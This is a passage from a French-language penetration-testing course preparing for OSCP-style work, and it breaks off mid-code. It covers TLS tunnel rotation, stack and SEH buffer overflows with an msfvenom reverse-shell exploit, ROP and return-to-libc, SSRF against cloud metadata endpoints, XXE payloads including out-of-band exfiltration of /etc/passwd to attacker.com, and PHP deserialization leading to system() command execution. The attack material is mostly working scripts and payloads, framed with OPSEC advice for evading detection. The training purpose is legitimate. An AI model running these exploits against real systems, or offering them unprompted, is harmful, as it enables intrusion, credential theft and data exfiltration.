    # Pause aléatoire avant de créer un nouveau tunnel
    pause_time=$((RANDOM % 60 + 30))
    echo "[+] Pause de $pause_time secondes"
    sleep $pause_time
done
EOF

chmod +x rotate_tunnels.sh
./rotate_tunnels.sh
```

11. **Nettoyage**

```bash
# Sur l'attaquant
# Arrêt des tunnels
pkill -f "socat.*OPENSSL"
pkill -f "stunnel"

# Suppression des fichiers temporaires
rm -f stunnel-*.conf

# Sur le pivot
# Arrêt des tunnels
pkill -f "socat.*OPENSSL-LISTEN"
pkill -f "stunnel"

# Arrêt du serveur web
pkill -f "python3 -m http.server 8080"
```

#### Vue Blue Team

Dans un environnement réel, cette approche de tunneling TLS personnalisé générerait des traces détectables :

1. **Logs générés**
   - Connexions TLS sur des ports non standard
   - Certificats auto-signés ou émis par des CA non reconnues
   - Suites de chiffrement inhabituelles

2. **Alertes potentielles**
   - Détection de tunnels TLS avec des caractéristiques inhabituelles
   - Détection de connexions TLS de longue durée
   - Détection de certificats non reconnus

3. **Contre-mesures possibles**
   - Inspection SSL/TLS pour analyser le trafic chiffré
   - Validation des certificats par rapport à des CA approuvées
   - Détection des anomalies dans les connexions TLS

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir créé un tunnel TLS personnalisé avec authentification mutuelle
- Comprendre comment configurer Socat et Stunnel pour le tunneling TLS
- Être capable de mettre en place un mécanisme de rotation automatique des tunnels
- Apprécier l'importance des techniques OPSEC de niveau 2 pour réduire la détectabilité des opérations
- Comprendre les traces générées par les tunnels TLS et comment les minimiser
# PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

## Chapitre 11 : Exploitation avancée

### Introduction : Pourquoi ce thème est important

Après avoir maîtrisé les bases de l'exploitation dans la partie précédente, ce chapitre plonge dans des techniques d'exploitation plus avancées, nécessaires pour aborder des scénarios complexes et réussir des certifications comme l'OSCP. Nous explorerons des sujets tels que l'exploitation de buffer overflows sur Windows et Linux, les techniques de contournement des protections mémoire (ASLR, DEP), l'exploitation de vulnérabilités web plus sophistiquées (SSRF, XXE), et l'utilisation avancée de Metasploit. Ces compétences sont cruciales pour compromettre des systèmes modernes et nécessitent une compréhension approfondie des mécanismes internes des systèmes d'exploitation et des applications. L'intégration de l'OPSEC de niveau 2 sera également essentielle pour mener ces exploitations de manière furtive.

### Buffer Overflows (Linux)

Le buffer overflow est une vulnérabilité classique mais toujours pertinente, permettant souvent d'obtenir une exécution de code arbitraire.

#### Principes du Buffer Overflow

1.  **Architecture de la mémoire**
    *   Pile (Stack) : Stockage des variables locales, adresses de retour, arguments de fonction.
    *   Tas (Heap) : Allocation dynamique de mémoire.
    *   Segments de données et de code.

2.  **Fonctionnement de la pile**
    *   Cadres de pile (Stack Frames) : Espace alloué pour chaque appel de fonction.
    *   Pointeur de pile (ESP) : Pointe vers le sommet de la pile.
    *   Pointeur de base (EBP) : Pointe vers la base du cadre de pile actuel.
    *   Adresse de retour (EIP/RIP) : Adresse de l'instruction à exécuter après le retour de la fonction.

3.  **Mécanisme du débordement**
    *   Écriture au-delà des limites d'un buffer alloué sur la pile.
    *   Écrasement des données adjacentes, y compris EBP et EIP.
    *   Contrôle de l'adresse de retour (EIP) pour rediriger l'exécution vers du code arbitraire (shellcode).

#### Environnement de développement et débogage

1.  **Compilation sans protections**
    ```bash
    # Compiler un programme C vulnérable sans protections
    gcc -m32 -fno-stack-protector -z execstack -no-pie vulnerable.c -o vulnerable
    # -m32 : Compiler en 32 bits (plus simple pour l'apprentissage)
    # -fno-stack-protector : Désactiver la protection canary
    # -z execstack : Rendre la pile exécutable (désactiver NX/DEP)
    # -no-pie : Désactiver ASLR pour le code exécutable
    ```

2.  **Désactivation d'ASLR (Address Space Layout Randomization)**
    ```bash
    # Désactiver ASLR temporairement (nécessite root)
    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    # Réactiver ASLR
    # echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
    ```

3.  **Utilisation de GDB (GNU Debugger)**
    ```bash
    # Installer GDB avec des extensions utiles (PEDA, GEF, ou pwndbg)
    # Exemple avec GEF
    bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
    
    # Lancer GDB
    gdb ./vulnerable
    
    # Commandes GDB utiles
    # run <args> : Exécuter le programme
    # break <fonction/adresse> : Placer un point d'arrêt
    # continue : Continuer l'exécution
    # info registers : Afficher les registres (eip, esp, ebp)
    # x/<n>x <adresse> : Examiner la mémoire (n mots hexadécimaux)
    # disassemble <fonction> : Désassembler une fonction
    # pattern create <longueur> : Créer un motif unique
    # pattern search <valeur> : Trouver l'offset d'une valeur dans le motif
    ```

#### Étapes de l'exploitation

1.  **Fuzzing : Trouver le point de crash**
    *   Envoyer des données de longueur croissante pour identifier la taille qui provoque le débordement et le crash.
    ```python
    # script_fuzz.py
    import socket
    
    host = "127.0.0.1"
    port = 9999
    
    buffer = b"A" * 100
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print(f"Sending {len(buffer)} bytes")
            s.send(buffer)
            s.close()
            buffer += b"A" * 100
        except:
            print(f"Crashed at {len(buffer)} bytes")
            break
    ```

2.  **Contrôle de l'offset EIP**
    *   Utiliser un motif unique (cyclic pattern) pour déterminer précisément l'offset où l'adresse de retour (EIP) est écrasée.
    ```bash
    # Dans GDB (avec GEF/PEDA/pwndbg)
    gef> pattern create 2000 cyclic_pattern.txt
    # Copier le contenu de cyclic_pattern.txt
    
    gef> run
    # Coller le motif unique comme input
    # Le programme crashe, EIP contient une partie du motif (ex: 0x41416e41)
    
    gef> pattern search 0x41416e41
    # Output: Found at offset 1500
    # L'offset EIP est 1500
    ```
    *   Vérification de l'offset : Envoyer `offset * 
A" + "BBBB" + "C" * (taille_totale - offset - 4)`. Si EIP contient `0x42424242` (BBBB), l'offset est correct.

3.  **Identification des mauvais caractères (Bad Characters)**
    *   Certains caractères (ex: `\x00` null byte, `\x0a` newline, `\x0d` carriage return) peuvent tronquer le shellcode ou être mal interprétés.
    *   Envoyer tous les caractères possibles (de `\x01` à `\xff`) après l'offset EIP et observer la mémoire dans GDB pour voir lesquels manquent ou sont corrompus.
    ```python
    # script_badchars.py
    import socket
    
    host = "127.0.0.1"
    port = 9999
    offset = 1500
    
    # Tous les caractères de 0x01 à 0xff
    badchars = bytearray(range(1, 256))
    
    payload = b"A" * offset + b"BBBB" + bytes(badchars)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(payload)
        s.close()
    except Exception as e:
        print(f"Error: {e}")
    ```
    ```bash
    # Dans GDB, après le crash
    gef> x/256xb $esp+4  # Examiner la mémoire où le shellcode devrait être
    # Comparer avec la liste des caractères envoyés pour identifier les manquants/corrompus
    # Retirer les mauvais caractères identifiés de la liste et répéter jusqu'à ce que tous les caractères restants soient présents.
    ```

4.  **Trouver une adresse de retour (JMP ESP)**
    *   L'objectif est de rediriger EIP vers une instruction `JMP ESP` (ou équivalent) qui se trouve dans une partie non randomisée de la mémoire (ex: une DLL chargée sans ASLR).
    *   Cette instruction fera sauter l'exécution au début du shellcode, qui a été placé sur la pile juste après l'adresse de retour écrasée.
    ```bash
    # Dans GDB (avec mona.py pour Windows, ou manuellement/avec des outils pour Linux)
    # Pour Linux (exemple manuel avec objdump ou GDB)
    gef> vmmap  # Lister les sections mémoire et leurs permissions
    # Identifier une section exécutable et non randomisée (ex: .text du binaire si -no-pie)
    
    gef> search-pattern jmp esp  # Rechercher l'instruction JMP ESP
    # Ou rechercher les opcodes correspondants (ex: \xff\xe4)
    gef> search-pattern "\xff\xe4"
    # Noter une adresse trouvée (ex: 0x08041234)
    
    # S'assurer que l'adresse ne contient pas de mauvais caractères.
    ```

5.  **Génération et injection du Shellcode**
    *   Utiliser `msfvenom` pour générer un shellcode (ex: un reverse shell) en excluant les mauvais caractères identifiés.
    ```bash
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a\x0d" -f python -v shellcode
    # -p : Payload à utiliser
    # LHOST, LPORT : Adresse et port de l'attaquant pour le reverse shell
    # -b : Mauvais caractères à exclure
    # -f : Format de sortie (python, c, raw, etc.)
    # -v : Nom de la variable pour le format python
    ```
    *   Construire l'exploit final :
        *   Padding (`A` * offset)
        *   Adresse de `JMP ESP` (en little-endian)
        *   NOP sled (optionnel, `\x90` * nombre) pour augmenter la fiabilité
        *   Shellcode généré
    ```python
    # exploit.py
    import socket
    import struct
    
    host = "127.0.0.1"
    port = 9999
    offset = 1500
    jmp_esp_addr = 0x08041234  # Adresse JMP ESP trouvée
    nop_sled = b"\x90" * 16
    
    # Shellcode généré par msfvenom (variable 'shellcode')
    shellcode = b"\xde\xc0\ ... (shellcode complet)"
    
    payload = b"A" * offset \
              + struct.pack("<I", jmp_esp_addr) \
              + nop_sled \
              + shellcode
    
    # Démarrer un listener netcat: nc -lvp 4444
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print("[+] Sending exploit...")
        s.send(payload)
        print("[+] Exploit sent!")
        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")
    ```

### Buffer Overflows (Windows)

L'exploitation de buffer overflows sous Windows présente des similarités mais aussi des différences clés par rapport à Linux.

#### Différences clés avec Linux

1.  **Protections mémoire** : Windows intègre des protections comme DEP (Data Execution Prevention, équivalent de NX) et ASLR plus robustes et activées par défaut.
2.  **API Windows** : Le shellcode doit utiliser les API Windows (ex: `LoadLibraryA`, `GetProcAddress`, `WinExec`, `socket`) au lieu des appels système Linux.
3.  **Débogage** : Les outils de débogage courants sont Immunity Debugger, OllyDbg, x64dbg, ou WinDbg, souvent utilisés avec des plugins comme Mona.py.
4.  **Adresses mémoire** : Les adresses des DLL système (kernel32.dll, ntdll.dll, etc.) sont souvent utilisées pour trouver des gadgets ROP ou des instructions `JMP ESP`.
5.  **SEH (Structured Exception Handling)** : Une autre cible courante pour l'écrasement de pointeurs sur la pile sous Windows.

#### Outils de débogage Windows

1.  **Immunity Debugger / OllyDbg / x64dbg** : Débogueurs populaires en mode utilisateur.
2.  **WinDbg** : Débogueur puissant de Microsoft, utile pour le débogage noyau et utilisateur.
3.  **Mona.py** : Plugin essentiel pour Immunity Debugger et WinDbg, automatisant de nombreuses tâches d'exploitation (recherche de gadgets, bad chars, etc.).
    ```
    # Commandes Mona.py utiles (dans Immunity/WinDbg)
    !mona config -set workingfolder c:\mona\%p
    !mona pattern_create 2000
    !mona pattern_offset <valeur_eip>
    !mona bytearray -b "\x00"
    !mona compare -f c:\mona\bytearray.bin -a <adresse_esp>
    !mona jmp -r esp -cpb "\x00\x0a\x0d"
    !mona find -s "\xff\xe4" -m module.dll
    !mona seh -cpb "\x00"
    !mona rop -m module.dll -cpb "\x00"
    ```

#### Exploitation via SEH Overwrite

Le SEH est un mécanisme de gestion des exceptions sous Windows. La chaîne SEH est stockée sur la pile et contient des pointeurs vers des gestionnaires d'exceptions.

1.  **Principe** : Écraser un enregistrement SEH sur la pile. L'enregistrement contient deux pointeurs : `Next SEH record` et `SEH handler`.
2.  **Objectif** : Contrôler à la fois `Next SEH record` et `SEH handler`.
3.  **Déclenchement** : Provoquer une exception après l'écrasement. Le système tentera d'exécuter le `SEH handler` écrasé.
4.  **Contraintes** :
    *   Le `SEH handler` doit pointer vers une instruction exécutable.
    *   Le `Next SEH record` doit également être contrôlé pour contourner certaines protections (SafeSEH).
5.  **Technique POP POP RET** :
    *   Trouver une instruction `POP reg, POP reg, RET` dans une DLL non protégée par SafeSEH.
    *   Placer l'adresse de cette instruction dans le `SEH handler` écrasé.
    *   Placer une instruction `JMP short` (saut court vers le shellcode) dans `Next SEH record`.
    *   Lorsque l'exception se produit, le `SEH handler` est appelé.
    *   `POP POP RET` retire deux valeurs de la pile (y compris `Next SEH record`) et exécute `RET`.
    *   `RET` saute à l'adresse qui se trouve maintenant au sommet de la pile, qui est l'adresse juste après l'enregistrement SEH écrasé.
    *   Si le `Next SEH record` contenait un `JMP short`, ce saut est exécuté, redirigeant vers le shellcode placé plus loin.

```python
# Exemple de structure d'exploit SEH Overwrite
offset_next_seh = 1000  # Offset jusqu'à Next SEH
offset_seh_handler = 1004 # Offset jusqu'à SEH Handler

pop_pop_ret_addr = 0x7C812345 # Adresse d'une instruction POP POP RET

# Saut court (ex: JMP +10 bytes -> \xeb\x08)
# Placé dans Next SEH, suivi de NOPs pour atteindre le shellcode
short_jmp = b"\xeb\x08\x90\x90" 

shellcode = b"..."

payload = b"A" * offset_next_seh \
          + short_jmp \
          + struct.pack('<I', pop_pop_ret_addr) \
          + shellcode
```

```
# Recherche d'instructions POP POP RET avec Mona
!mona seh -cpb "\x00"
```

### Contournement des protections mémoire

Les systèmes modernes implémentent des protections pour rendre l'exploitation de buffer overflows plus difficile.

#### ASLR (Address Space Layout Randomization)

ASLR randomise l'adresse de base de la pile, du tas, et des bibliothèques chargées à chaque exécution.

1.  **Impact** : Rend difficile la prédiction des adresses (ex: adresse de `JMP ESP`, gadgets ROP, adresse du shellcode sur la pile).
2.  **Techniques de contournement** :
    *   **Attaque par force brute (32 bits)** : Sur les systèmes 32 bits, l'entropie d'ASLR est limitée, permettant parfois de forcer l'adresse par essais successifs.
    *   **Fuite d'information (Info Leak)** : Exploiter une autre vulnérabilité pour divulguer une adresse en mémoire (ex: adresse d'une fonction dans une DLL chargée). Cette adresse peut servir de point de référence pour calculer d'autres adresses.
    *   **Utilisation de modules non-ASLR** : Si une DLL est chargée sans ASLR (rare sur les systèmes modernes), les adresses de ses instructions (y compris `JMP ESP` ou gadgets ROP) sont fixes.
        ```
        # Trouver des modules non-ASLR avec Mona
        !mona modules
        ```
    *   **Écrasement partiel d'EIP (Partial Overwrite)** : Si seulement les octets de poids faible de l'adresse de retour sont écrasés, il est parfois possible de rediriger l'exécution vers une instruction proche dans le même module, contournant ASLR pour ce saut initial.

#### DEP/NX (Data Execution Prevention / No-Execute)

DEP marque les zones de mémoire (comme la pile et le tas) comme non exécutables, empêchant l'exécution directe de shellcode injecté.

1.  **Impact** : Le shellcode placé sur la pile ne peut pas être exécuté directement, même si EIP pointe dessus.
2.  **Techniques de contournement** :
    *   **Return-Oriented Programming (ROP)** :
        *   **Principe** : Au lieu d'injecter du shellcode, l'attaquant réutilise des petits bouts de code existants (appelés "gadgets") qui se terminent par une instruction `RET`.
        *   **Chaîne ROP** : Une séquence d'adresses de gadgets est placée sur la pile. Chaque `RET` d'un gadget saute à l'adresse du gadget suivant sur la pile.
        *   **Objectif** : Enchaîner des gadgets pour effectuer des opérations complexes (ex: appeler `VirtualProtect` ou `mprotect` pour rendre la pile exécutable, puis sauter au shellcode, ou construire directement l'équivalent d'un shellcode avec des gadgets).
        *   **Recherche de gadgets** : Utilisation d'outils comme `ROPgadget`, `rp++`, ou `mona.py`.
            ```bash
            # Utilisation de ROPgadget
            ROPgadget --binary ./executable --ropchain
            ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 --only "pop|ret"
            ```
            ```
            # Utilisation de Mona
            !mona rop -m module.dll -cpb "\x00"
            !mona ropfunc
            ```
        *   **Exemple de chaîne ROP simple (Windows)** : Appeler `VirtualProtect` pour rendre le shellcode exécutable.
            ```python
            # Adresses des gadgets et fonctions (obtenues via Mona/ROPgadget)
            pop_eax_ret = 0x7C812345
            pop_ebx_ret = 0x7C823456
            pop_ecx_ret = 0x7C834567
            pop_edx_ret = 0x7C845678
            mov_ptr_eax_ecx_ret = 0x7C856789 # mov [eax], ecx; ret
            xor_eax_eax_ret = 0x7C867890     # xor eax, eax; ret
            add_eax_dword_ptr_ret = 0x7C878901 # add eax, [addr]; ret
            virtual_protect_addr = 0x7C801234 # Adresse de VirtualProtect
            jmp_esp_addr = 0x7C889012
            
            shellcode_addr = 0x0012FABC # Adresse approximative du shellcode sur la pile
            size = 0x201 # Taille à rendre exécutable
            new_protect = 0x40 # PAGE_EXECUTE_READWRITE
            old_protect_addr = 0x0012FF00 # Adresse sur la pile pour stocker l'ancienne protection
            
            rop_chain = [
                # Préparer les arguments pour VirtualProtect(shellcode_addr, size, new_protect, old_protect_addr)
                pop_eax_ret, virtual_protect_addr, # EAX = Adresse de VirtualProtect
                # ... (gadgets pour mettre les arguments dans les bons registres ou sur la pile)
                # ... (gadgets pour appeler EAX)
                
                # Après l'appel à VirtualProtect, sauter au shellcode
                jmp_esp_addr # Ou adresse directe du shellcode si connue
            ]
            
            payload = b"A" * offset \
                      + b"BBBB" # EIP initial (sera écrasé par le premier RET de la chaîne ROP)
                      + b"".join(struct.pack('<I', addr) for addr in rop_chain) \
                      + nop_sled \
                      + shellcode
            ```
    *   **Return-to-libc** :
        *   **Principe** : Rediriger l'exécution vers des fonctions existantes dans des bibliothèques chargées (comme la `libc` sous Linux ou `kernel32.dll` sous Windows) au lieu d'injecter du shellcode.
        *   **Objectif** : Appeler directement des fonctions comme `system()` (Linux) ou `WinExec()` (Windows) avec des arguments contrôlés (ex: `/bin/sh` ou `calc.exe`).
        *   **Nécessite** : Connaître l'adresse de la fonction cible (contournement ASLR nécessaire si activé) et pouvoir placer les arguments de la fonction sur la pile ou dans les registres avant l'appel.
        ```python
        # Exemple simple return-to-system (Linux, ASLR désactivé)
        offset = 1500
        system_addr = 0xb7e4c080 # Adresse de system() dans libc
        exit_addr = 0xb7e3fc70   # Adresse de exit() dans libc
        bin_sh_addr = 0xb7f6c8a8 # Adresse de "/bin/sh" dans libc
        
        payload = b"A" * offset \
                  + struct.pack('<I', system_addr) \
                  + struct.pack('<I', exit_addr) \
                  + struct.pack('<I', bin_sh_addr)
        ```


# PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

## Chapitre 11 : Exploitation avancée (suite)

### Vulnérabilités Web avancées

Au-delà des vulnérabilités web de base (XSS, SQLi, etc.), les pentests avancés nécessitent la maîtrise de vulnérabilités plus sophistiquées.

#### Server-Side Request Forgery (SSRF)

Le SSRF permet à un attaquant de forcer le serveur à effectuer des requêtes HTTP vers des destinations arbitraires, souvent internes.

1. **Principes du SSRF**
   - Le serveur effectue des requêtes HTTP basées sur des entrées utilisateur
   - L'attaquant manipule ces entrées pour cibler des systèmes internes
   - Contournement des restrictions réseau (le serveur a souvent accès à des ressources internes)
   - Accès à des métadonnées cloud (ex: AWS/GCP/Azure metadata endpoints)

2. **Vecteurs d'attaque courants**
   ```
   # Paramètres URL classiques
   https://example.com/fetch?url=http://internal-server/admin
   
   # Formats d'URL alternatifs
   https://example.com/fetch?url=http://127.0.0.1:22
   https://example.com/fetch?url=http://localhost/admin
   https://example.com/fetch?url=http://[::1]/admin
   https://example.com/fetch?url=http://2130706433/admin (127.0.0.1 en décimal)
   
   # Protocoles alternatifs
   https://example.com/fetch?url=file:///etc/passwd
   https://example.com/fetch?url=dict://internal-server:11211/stats
   https://example.com/fetch?url=gopher://internal-server:25/xHELO%20localhost
   ```

3. **Contournement des protections**
   ```
   # Utilisation de redirections
   https://example.com/fetch?url=https://attacker.com/redirect.php
   # redirect.php redirige vers http://internal-server/admin
   
   # Double encodage
   https://example.com/fetch?url=http%3A%2F%2F127.0.0.1%3A22
   
   # Utilisation de sous-domaines
   https://example.com/fetch?url=http://internal-server.attacker.com
   # Où internal-server.attacker.com pointe vers 127.0.0.1
   
   # Utilisation de DNS rebinding
   # Configurer un domaine qui alterne entre une IP publique et une IP interne
   ```

4. **Exploitation des métadonnées cloud**
   ```
   # AWS EC2 Metadata
   https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
   https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   
   # GCP Metadata
   https://example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/
   
   # Azure Metadata
   https://example.com/fetch?url=http://169.254.169.254/metadata/instance
   ```

5. **Exploitation avancée : Chaînage avec d'autres vulnérabilités**
   ```
   # SSRF vers Memcached (port 11211)
   https://example.com/fetch?url=dict://internal-server:11211/stats
   https://example.com/fetch?url=gopher://internal-server:11211/1stats%0D%0A
   
   # SSRF vers Redis (port 6379)
   https://example.com/fetch?url=gopher://internal-server:6379/_SET%20ssrf_test%20%22Hello%20SSRF%22%0D%0A
   
   # SSRF vers SMTP (port 25) pour envoyer des emails
   https://example.com/fetch?url=gopher://internal-server:25/xHELO%20localhost%0D%0AMAIL%20FROM%3A%3Cattacker%40example.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40example.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AThis%20is%20a%20SSRF%20test.%0D%0A.%0D%0AQUIT%0D%0A
   ```

6. **Script d'exploitation SSRF**
   ```python
   #!/usr/bin/env python3
   import requests
   import sys
   import urllib.parse
   
   def test_ssrf(url, target):
       print(f"[*] Testing SSRF on {url} targeting {target}")
       
       # Encodage de l'URL cible
       encoded_target = urllib.parse.quote_plus(target)
       
       # Construction de l'URL complète
       full_url = f"{url}?url={encoded_target}"
       
       try:
           # Envoi de la requête
           response = requests.get(full_url, timeout=10)
           
           # Analyse de la réponse
           print(f"[+] Status code: {response.status_code}")
           print(f"[+] Response size: {len(response.text)} bytes")
           
           # Affichage des premiers 200 caractères de la réponse
           print(f"[+] Response preview: {response.text[:200]}...")
           
           return response.text
       except Exception as e:
           print(f"[-] Error: {e}")
           return None
   
   def scan_common_targets(url):
       targets = [
           "http://127.0.0.1/",
           "http://localhost/",
           "http://[::1]/",
           "http://internal-server/",
           "http://169.254.169.254/latest/meta-data/",
           "file:///etc/passwd",
           "http://127.0.0.1:22/",
           "http://127.0.0.1:3306/",
           "http://127.0.0.1:6379/",
           "http://127.0.0.1:11211/"
       ]
       
       results = {}
       for target in targets:
           print(f"\n[*] Trying target: {target}")
           result = test_ssrf(url, target)
           results[target] = result
       
       return results
   
   if __name__ == "__main__":
       if len(sys.argv) < 2:
           print(f"Usage: {sys.argv[0]} <vulnerable_url> [target_url]")
           print(f"Example: {sys.argv[0]} https://example.com/fetch http://internal-server/")
           sys.exit(1)
       
       vuln_url = sys.argv[1]
       
       if len(sys.argv) >= 3:
           target_url = sys.argv[2]
           test_ssrf(vuln_url, target_url)
       else:
           print("[*] No specific target provided, scanning common targets...")
           scan_common_targets(vuln_url)
   ```

#### XML External Entity (XXE) Injection

L'XXE permet à un attaquant d'accéder à des fichiers locaux ou d'effectuer des requêtes réseau via le parseur XML du serveur.

1. **Principes de l'XXE**
   - Exploitation des parseurs XML qui traitent les entités externes
   - Accès à des fichiers locaux via l'entité `SYSTEM`
   - Exfiltration de données via des canaux out-of-band
   - Possibilité de SSRF via XXE

2. **Détection de la vulnérabilité**
   ```xml
   <!-- Payload de base pour tester la vulnérabilité -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <root>&xxe;</root>
   ```

3. **Lecture de fichiers locaux**
   ```xml
   <!-- Lecture de /etc/passwd -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <foo>&xxe;</foo>
   
   <!-- Lecture de fichiers Windows -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
   <foo>&xxe;</foo>
   
   <!-- Lecture de fichiers PHP -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
   <foo>&xxe;</foo>
   ```

4. **XXE pour SSRF**
   ```xml
   <!-- Accès à des services internes -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-server:8080/admin"> ]>
   <foo>&xxe;</foo>
   
   <!-- Accès aux métadonnées cloud -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
   <foo>&xxe;</foo>
   ```

5. **Exfiltration out-of-band (XXE-OOB)**
   ```xml
   <!-- Exfiltration via DTD externe -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
   <foo>1</foo>
   
   <!-- Contenu de evil.dtd sur le serveur attaquant -->
   <!ENTITY % data SYSTEM "file:///etc/passwd">
   <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%data;'>">
   %param1;
   %exfil;
   ```

6. **Contournement des protections**
   ```xml
   <!-- Utilisation d'encodages alternatifs -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> ]>
   <foo>&xxe;</foo>
   
   <!-- Utilisation d'entités paramétrées -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
     %eval;
     %error;
   ]>
   <foo>1</foo>
   ```

7. **Script d'exploitation XXE**
   ```python
   #!/usr/bin/env python3
   import requests
   import sys
   import base64
   
   def test_xxe(url, payload, content_type="application/xml"):
       print(f"[*] Testing XXE on {url}")
       print(f"[*] Payload: {payload[:100]}...")
       
       headers = {"Content-Type": content_type}
       
       try:
           # Envoi de la requête
           response = requests.post(url, data=payload, headers=headers, timeout=10)
           
           # Analyse de la réponse
           print(f"[+] Status code: {response.status_code}")
           print(f"[+] Response size: {len(response.text)} bytes")
           
           # Affichage des premiers 200 caractères de la réponse
           print(f"[+] Response preview: {response.text[:200]}...")
           
           return response.text
       except Exception as e:
           print(f"[-] Error: {e}")
           return None
   
   def generate_xxe_payloads(target_file=None):
       payloads = []
       
       # Payload de base pour tester la vulnérabilité
       payloads.append('''<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <root>&xxe;</root>''')
       
       # Payload pour lire un fichier spécifique
       if target_file:
           payloads.append(f'''<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://{target_file}"> ]>
   <root>&xxe;</root>''')
       
       # Payload pour PHP filter
       payloads.append('''<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
   <root>&xxe;</root>''')
       
       # Payload pour SSRF via XXE
       payloads.append('''<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/"> ]>
   <root>&xxe;</root>''')
       
       # Payload pour AWS metadata
       payloads.append('''<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
   <root>&xxe;</root>''')
       
       return payloads
   
   if __name__ == "__main__":
       if len(sys.argv) < 2:
           print(f"Usage: {sys.argv[0]} <vulnerable_url> [target_file]")
           print(f"Example: {sys.argv[0]} https://example.com/xml file:///etc/shadow")
           sys.exit(1)
       
       url = sys.argv[1]
       target_file = sys.argv[2] if len(sys.argv) >= 3 else None
       
       payloads = generate_xxe_payloads(target_file)
       
       for i, payload in enumerate(payloads):
           print(f"\n[*] Testing payload {i+1}/{len(payloads)}")
           response = test_xxe(url, payload)
           
           # Tentative de décodage base64 si présent
           if response and "base64" in payload:
               try:
                   # Extraction du contenu base64 (simplifié, à adapter selon la réponse réelle)
                   base64_data = response.strip()
                   decoded = base64.b64decode(base64_data).decode('utf-8')
                   print(f"[+] Base64 decoded content: {decoded[:200]}...")
               except Exception as e:
                   print(f"[-] Failed to decode base64: {e}")
   ```

#### Insecure Deserialization

La désérialisation non sécurisée permet à un attaquant d'exécuter du code arbitraire en manipulant des objets sérialisés.

1. **Principes de la désérialisation non sécurisée**
   - La sérialisation convertit des objets en chaînes de caractères pour stockage/transmission
   - La désérialisation reconstruit ces objets à partir des chaînes
   - Si les données désérialisées sont contrôlées par l'attaquant, il peut manipuler l'état interne de l'application
   - Peut mener à l'exécution de code arbitraire via des "gadget chains"

2. **Vulnérabilités par langage**
   - **PHP** : Utilisation de `unserialize()` sur des données non fiables
   - **Java** : Désérialisation d'objets Java via `ObjectInputStream.readObject()`
   - **Python** : Utilisation de `pickle.loads()` ou `yaml.load()` (sans `SafeLoader`)
   - **Node.js** : Utilisation de `node-serialize` ou désérialisation JSON non sécurisée

3. **Exploitation en PHP**
   ```php
   // Exemple de classe vulnérable
   class User {
       public $username;
       public $isAdmin = false;
       
       function __wakeup() {
           // Méthode magique appelée lors de la désérialisation
           echo "Deserializing user: " . $this->username;
       }
       
       function __destruct() {
           // Méthode magique appelée lors de la destruction de l'objet
           if($this->isAdmin) {
               echo "Admin user destroyed";
           }
       }
   }
   
   // Exploitation simple pour modifier l'état
   $user = new User();
   $user->username = "hacker";
   $user->isAdmin = true;
   
   $serialized = serialize($user);
   echo $serialized;
   // Output: O:4:"User":2:{s:8:"username";s:6:"hacker";s:7:"isAdmin";b:1;}
   ```

4. **Exploitation RCE en PHP avec POP Chains**
   ```php
   // Classe vulnérable avec exécution de commande
   class CustomTemplate {
       private $template_file_path;
       
       function __construct($template_file_path) {
           $this->template_file_path = $template_file_path;
       }
       
       function __destruct() {
           // Exécute une commande lors de la destruction
           system("cat " . $this->template_file_path);
       }
   }
   
   // Exploitation pour RCE
   $exploit = new CustomTemplate(';id;');
